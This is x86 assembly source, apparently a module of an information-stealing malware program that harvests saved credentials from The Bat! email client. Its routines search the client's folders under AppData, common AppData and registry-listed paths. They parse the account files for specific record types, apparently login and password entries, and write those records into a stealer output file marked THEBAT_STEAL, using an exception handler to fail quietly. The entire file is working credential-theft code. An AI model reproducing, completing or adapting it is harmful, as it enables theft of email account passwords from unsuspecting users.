
.data?
      TheBatTmpBuf1 db 200h dup (?)
      TheBatTmpBuf2 db 200h dup (?)
      TheBatTmpBuf3 db 200h dup (?)
      TheBatTmpBuf4 db 400h dup (?)
      TheBat_login  db 100h dup (?)
      TheBat_pwd    db 100h dup (?)
      batfd         WIN32_FIND_DATA <>
     
.code

GetTheBatPass2 proc uses esi edi ebx Mem:DWORD, filesize:DWORD
      LOCAL   tLen, cMaxOffs: DWORD
      mov     esi, dword ptr [Mem]
      mov     cMaxOffs, esi
      mov     eax, dword ptr [filesize]
      add     cMaxOffs, eax 
      lodsd   ; index_num
      mov     ecx, eax
      test    ecx, ecx
      je      gtbp2_unmap
      ; Calc offset to the stored data
      xor     edx, edx
      mov     ebx, 13
      mul     ebx
      add     eax, 8
      mov     tLen, eax
      add     tLen, esi
    l_idx:
      lodsb    ; flag: 0x00 - valid
      .if !al
              lodsd   ; seq
              mov     ebx, eax
              lodsd   ; offset
              mov     edi, tLen
              add     edi, eax
              lodsd   ; len
              ; Check for overflow
              push    edi
              add     edi, eax
              .if edi > cMaxOffs
                      pop      edi
                      jmp      gtbp2_unmap 
              .endif
              pop      edi 
              .if     (ebx == 00008159h) || (ebx == 00008179h) || (ebx == 000081A7h) || (ebx == 000081A6h) || (ebx == 000081A8h) || (ebx == 00008174h) || (ebx == 00008195h) || (ebx == 000081BDh) || (ebx == 0000819Eh)
                      pushad
                      call    TheBatWriteData
                      popad
              .endif
      .else
              add     esi, 3*4
      .endif
      dec     ecx
      jnz     l_idx
    gtbp2_unmap:
      ret
GetTheBatPass2 endp

TheBatWriteData proc
      LOCAL dtype:dword
      push    edi
      mov     dword ptr [plen], eax ; len
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     dword ptr [dtype], ebx ; type
      add     dword ptr [DataSize], sizeof dtype
      WriteFile, stfile, addr dtype, sizeof dtype, addr SNW, NULL
      pop     edi
      WriteFile, stfile, edi, plen, addr SNW, NULL
      ret
TheBatWriteData endp

TheBatProcessFile proc
      invoke  MapFile, addr TheBatTmpBuf2, addr mfile, MAP_FILE_A
      test    eax, eax
      je      TheBat_skip
      push    mfile.dwFileSize
      push    mfile.lpMem
      call    GetTheBatPass2
      invoke  UnmapFile, addr mfile
    TheBat_skip:
      ret
TheBatProcessFile endp

TheBatDoSearchShit proc search_in:DWORD
      LOCAL   hFind :DWORD
      
      lstrcpy, addr TheBatTmpBuf2, search_in
      lstrcat, addr TheBatTmpBuf2, addr TheBat_file1
      call    TheBatProcessFile
      
      lstrcat, search_in, addr wildc 
      
      FindFirstFile, search_in, addr batfd
      mov     dword ptr [hFind], eax
      cmp     eax, -1
      je      TheBat_fail_1
      
      lstrlen, search_in
      mov     ecx, dword ptr [search_in]
      mov     byte ptr [ecx + eax - 1], 0
      
      jmp     TheBat_skip_search
    TheBat_search_lp:
      mov     eax, batfd.dwFileAttributes
      and     eax, FILE_ATTRIBUTE_DIRECTORY
      je      TheBat_skip_search  
      
      lstrcmp, addr batfd.cFileName, addr fake1
      test    eax, eax
      je      TheBat_skip_search
      lstrcmp, addr batfd.cFileName, addr fake2
      test    eax, eax
      je      TheBat_skip_search
      
      lstrcpy, addr TheBatTmpBuf2, search_in
      lstrcat, addr TheBatTmpBuf2, addr batfd.cFileName
      push    offset TheBatTmpBuf2
      call    dword ptr [_PathAddBackslash]
      lstrcat, addr TheBatTmpBuf2, addr TheBat_file1
      call    TheBatProcessFile
    
    TheBat_skip_search:
      FindNextFile, hFind, addr batfd
      test    eax, eax
      jne     TheBat_search_lp
      FindClose, hFind
    TheBat_fail_1:
      
      ret
TheBatDoSearchShit endp

GetTheBatPwd proc
      LOCAL   WTF:DWORD
      
      mov     dword ptr [DataSize], 0
      mov     dword ptr [stbuf], THEBAT_STEAL
      WriteFile, stfile, addr stbuf, sizeof stbuf, addr SNW, NULL
      
      push    offset stealer_seh_proc
      assume  fs : nothing
      push    dword ptr fs:[0]
      mov     dword ptr fs:[0], esp
      mov     eax, offset GetTheBatPwd_seh
      mov     seh.SafeEip, eax
      mov     seh.PrevEbp, ebp
      mov     seh.PrevEsp, esp
      SetFilePointer, stfile, 0, 0, FILE_CURRENT
      mov     dword ptr [savedfilepointer], eax
      
      ; App Data
      mov     byte ptr [TheBatTmpBuf1], 0
      mov     byte ptr [TheBatTmpBuf3], 0
      push    0
      push    CSIDL_APPDATA
      push    offset TheBatTmpBuf1
      push    0
      call    dword ptr [_SHGetSpecialFolderPath]
      push    offset TheBatTmpBuf1
      call    dword ptr [_PathAddBackslash]
      lstrcpy, addr TheBatTmpBuf3, addr TheBatTmpBuf1
      lstrcat, addr TheBatTmpBuf1, addr TheBat_str_1
      lstrcat, addr TheBatTmpBuf3, addr TheBat_str_2
      push    offset TheBatTmpBuf1
      call    TheBatDoSearchShit
      push    offset TheBatTmpBuf3
      call    TheBatDoSearchShit
      
      ; Common App Data
      mov     byte ptr [TheBatTmpBuf1], 0
      mov     byte ptr [TheBatTmpBuf3], 0
      push    0
      push    CSIDL_COMMON_APPDATA
      push    offset TheBatTmpBuf1
      push    0
      call    dword ptr [_SHGetSpecialFolderPath]
      push    offset TheBatTmpBuf1
      call    dword ptr [_PathAddBackslash]
      lstrcpy, addr TheBatTmpBuf3, addr TheBatTmpBuf1
      lstrcat, addr TheBatTmpBuf1, addr TheBat_str_1
      lstrcat, addr TheBatTmpBuf3, addr TheBat_str_2
      push    offset TheBatTmpBuf1
      call    TheBatDoSearchShit
      push    offset TheBatTmpBuf3
      call    TheBatDoSearchShit
      
      ; Working Directory
      invoke  RegRead, HKEY_LOCAL_MACHINE, addr TheBat_reg1, addr TheBat_regval1, addr TheBatTmpBuf1, sizeof TheBatTmpBuf1, REG_READ_A
      test    eax, eax
      je      nothebat_regkey1
      push    offset TheBatTmpBuf1
      call    TheBatDoSearchShit
    nothebat_regkey1:
      invoke  RegRead, HKEY_CURRENT_USER, addr TheBat_reg1, addr TheBat_regval1, addr TheBatTmpBuf1, sizeof TheBatTmpBuf1, REG_READ_A
      test    eax, eax
      je      nothebat_regkey2
      push    offset TheBatTmpBuf1
      call    TheBatDoSearchShit
    nothebat_regkey2:
      invoke  RegRead, HKEY_LOCAL_MACHINE, addr TheBat_reg1, addr TheBat_regval1, addr TheBatTmpBuf1, sizeof TheBatTmpBuf1, REG_READ_A
      test    eax, eax
      je      nothebat_regkey3
      ExpandEnvironmentStrings, addr TheBatTmpBuf1, addr TheBatTmpBuf4, sizeof TheBatTmpBuf4
      push    offset TheBatTmpBuf4
      call    dword ptr [_PathAddBackslash]
      push    offset TheBatTmpBuf4
      call    TheBatDoSearchShit
    nothebat_regkey3:
      invoke  RegRead, HKEY_CURRENT_USER, addr TheBat_reg1, addr TheBat_regval1, addr TheBatTmpBuf1, sizeof TheBatTmpBuf1, REG_READ_A
      test    eax, eax
      je      nothebat_regkey4
      ExpandEnvironmentStrings, addr TheBatTmpBuf1, addr TheBatTmpBuf4, sizeof TheBatTmpBuf4
      push    offset TheBatTmpBuf4
      call    dword ptr [_PathAddBackslash]
      push    offset TheBatTmpBuf4
      call    TheBatDoSearchShit
    nothebat_regkey4:
      
      
    GetTheBatPwd_seh:
      pop     dword ptr fs:[0]
      add     esp, 4
      
      WriteFile, stfile, addr DataSize, sizeof DataSize, addr SNW, NULL
      mov     eax, dword ptr [DataSize] ; return actual size of written data
      ret
GetTheBatPwd endp
